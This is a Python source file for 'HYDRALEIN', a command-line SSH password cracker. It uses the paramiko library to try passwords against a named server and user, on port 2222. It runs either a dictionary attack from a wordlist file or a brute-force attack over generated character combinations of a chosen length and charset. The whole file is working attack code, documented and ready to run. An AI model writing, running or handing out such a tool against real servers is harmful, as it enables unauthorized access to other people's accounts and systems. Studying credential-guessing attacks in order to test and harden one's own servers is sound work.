"""
HYDRALEIN - A programm to crack SSH passwords. 
If you know the username and the address of a server, you can try to crack the password of the SSH connection with
a dictionary- or brute-force attack.
"""

import argparse
import paramiko
import itertools
import string


def parse_charset(charset_input: str) -> str:
    """
    Converts an input character set into a predefined list of character categories.

    This function takes an input string (`charset_input`) and generates a character set 
    based on the specified symbols:
    - 'A' adds all uppercase letters A-Z (string.ascii_uppercase).
    - 'a' adds all lowercase letters a-z (string.ascii_lowercase).
    - '1' adds all digits 0-9 (string.digits).
    - '!' adds all special characters (string.punctuation).

    If none of the specified symbols are present, the original input character set is returned.

    Args:
        charset_input (str): A string that specifies which categories of characters should be 
                             included in the returned character set.

    Returns:
        str: A composite character set or the original input if no known categories were specified.
    """
    charset = ''

    if 'A' in charset_input:
        # adds all uppercase letters A-Z
        charset += string.ascii_uppercase
    if 'a' in charset_input:
        # adds all lowercase letters a-z
        charset += string.ascii_lowercase
    if '1' in charset_input:
        # adds all digits 0-9
        charset += string.digits
    if '!' in charset_input:
        # adds all special characters
        charset += string.punctuation
    
    return charset if charset else charset_input


def ssh_connect(server: str, username: str, password: str) -> bool:
    """
    This function attempts to establish an SSH connection to a server using the provided credentials.

    This function tries to connect to the specified SSH server on port 2222 using the given 
    username and password. If the connection is successful, it prints the valid password.
    In case of failed authentication, it catches the error and returns False.
    Additionally, if other SSH-related exceptions occur, they are caught and printed.

    Args:
        Command-line arguments:
        server (str): The address of the target SSH server (IP or hostname).
        username (str): The username to use for the SSH connection.
        
        Given from Brute-Force or Dictionary Attack:
        password (str): The password to attempt for the SSH connection.

    Returns:
        bool: Returns True if the SSH connection is successful and the password is correct,
              otherwise returns False if the authentication fails.
    
    Raises:
        paramiko.SSHException: If an SSH-related error occurs during the connection attempt.
    
    Example:
        >>> ssh_connect('123.4.5.6', 'user', 'password123')
        Password for user user is: password123.
        True
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(server, port=2222, username=username, password=password)
        print(f"Password for user {username} is: {password}.")
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"Error: {e}")
    finally:
        ssh.close()


def dictionary_attack(server: str, username: str, wordlist: str) -> bool:
    """
    This function performs a dictionary attack on an SSH server using a wordlist of potential passwords.

    It attempts to connect to the SSH server using each password in combination with the provided username.
    If a valid password is found, the function returns True. The attack stops as soon as a 
    successful connection is made.

    Args:
        server (str): The address of the target SSH server (IP or hostname).
        username (str): The username to use for the SSH connection.
        wordlist (str): The path to a file containing a list of passwords to try.

    Returns:
        bool: Returns True if a valid password is found and the SSH connection is successful,
              otherwise returns False if no valid password is found after all passwords have been tried.
    """
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            # print(f"Trying password: {password}")
            if ssh_connect(server, username, password):
                return True
    return False


def brute_force_attack(server: str, username: str, min_len: int, max_len: int, charset: str) -> bool:
    """
    This function performs a Brute-Force attack on an SSH server by generating and trying passwords of varying lengths.

    This function attempts to connect to the SSH server using all possible combinations of characters
    from the provided or default charset. It generates passwords within the specified length range (`min_len` to `max_len`),
    and tries each password until a successful connection is established or all possibilities are exhausted.

    Args:
        server (str): The address of the target SSH server (IP or hostname).
        username (str): The username to use for the SSH connection.
        
        optional:
        min_len (int): The minimum password length to start the brute-force attack.
        max_len (int): The maximum password length for the brute-force attack.
        charset (str): The set of characters to use when generating passwords.

    Returns:
        bool: Returns True if a valid password is found and the SSH connection is successful, 
              otherwise returns False if no valid password is found.
    """
    for length in range(min_len, max_len + 1):
        for password_tuple in itertools.product(charset, repeat=length):
            password = ''.join(password_tuple)
            print(f"Trying password: {password}")
            if ssh_connect(server, username, password):
                return True
    return False


def main() -> None:
    """
    Main function for HYDRALEIN:

    It parses command-line arguments and runs either a Dictionary Attack or a Brute-Force Attack 
    on an SSH server, based on the provided input.

    The program expects arguments such as username, server and optional wordlist (for Dictionary Attack), 
    min- / maxlength and charset (both for Brute-Force Attack). See the argparse argument descriptions for details.

    Workflow:
        - First the argument parser (`argparse.ArgumentParser`) is created to process the command-line inputs.
        - Then that the function defines the supported command-line arguments.
        - After parsing the arguments, the function determines whether to run a Dictionary Attack (if a wordlist is provided)
          or a Brute-Force Attack (by optionally using a charset and password length).
        - The charset argument -c is processed using the `parse_charset()` function, which generates the appropriate character set 
          for the Brute-Force Attack.
        - The funtion will output whether the password was successfully cracked or not.

    Returns:
        None
    """
    parser = argparse.ArgumentParser(description='SSH Password Cracker')

    parser.add_argument('-u', '--username', required=True, type=str, help='User of SSH connection')
    parser.add_argument('-s', '--server', required=True, help='Address of target server (IP or DNS)')
    parser.add_argument('-w', '--wordlist', type=str, help='Path to wordlist for Dictionary Attack')
    parser.add_argument('--min', type=int, default=4, help='Minimum password length for Brute-Force Attack')
    parser.add_argument('--max', type=int, default=6, help='Maximum password length for Brute-Force Attack')
    parser.add_argument('-c', '--charset', type=str, default='a1', help=r'''Charset to use for Brute-Force Attack (default: lowercase letters and digits).
                                                                            Available option:
                                                                            A: Uppercase letters (A-Z)
                                                                            a: Lowercase letters (a-z)
                                                                            1: Digits (0-9)
                                                                            !: Special characters
                                                                            Example that uses all options: -c Aa1!''')

    args = parser.parse_args()
    
    charset = parse_charset(args.charset)

    if args.wordlist:
        print(f"Starting a Dictionary Attack on server: {args.server} ...")
        success = dictionary_attack(args.server, args.username, args.wordlist)
    else:
        print(f"Starting a Brute-Force Attack on server: {args.server} with charset {charset} ...")
        success = brute_force_attack(args.server, args.username, args.min, args.max, charset)
    
    if success:
        print("Password cracked successfully!")
    else:
        print("Attack failed. No valid password found.")


if __name__ == "__main__":
    main()